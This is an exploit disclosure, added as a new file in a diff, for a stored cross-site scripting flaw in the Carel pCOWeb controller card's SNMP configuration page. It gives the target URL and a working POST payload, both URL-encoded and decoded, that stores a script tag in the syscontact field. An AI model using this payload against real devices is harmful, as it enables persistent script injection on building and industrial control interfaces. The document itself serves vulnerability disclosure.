@@ -1,0 +1,19 @@
+# Exploit Title: Carel pCOWeb - Stored XSS
+# Date: 2019-04-16
+# Exploit Author: Luca.Chiou
+# Vendor Homepage: https://www.carel.com/
+# Version: Carel pCOWeb all versions prior to B1.2.1
+# Tested on: It is a proprietary devices: http://www.carel.com/product/pcoweb-card
+
+# 1. Description:
+# In Carel pCOWeb web page,
+# user can modify the system configuration by access the /config/pw_snmp.html.
+# Attackers can inject malicious XSS code in post data.
+# The XSS code will be stored in database, so that cause a stored XSS vulnerability.
+
+# 2. Proof of Concept:
+# Browse http://<Your<http://%3cYour> Modem IP>/config/pw_snmp.html
+# Send this post data:
+%3Fscript%3Asetdb%28%27snmp%27%2C%27syscontact%27%29=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E
+# The post data in URL decode format is:
+?script:setdb('snmp','syscontact')="><script>alert(123)</script>
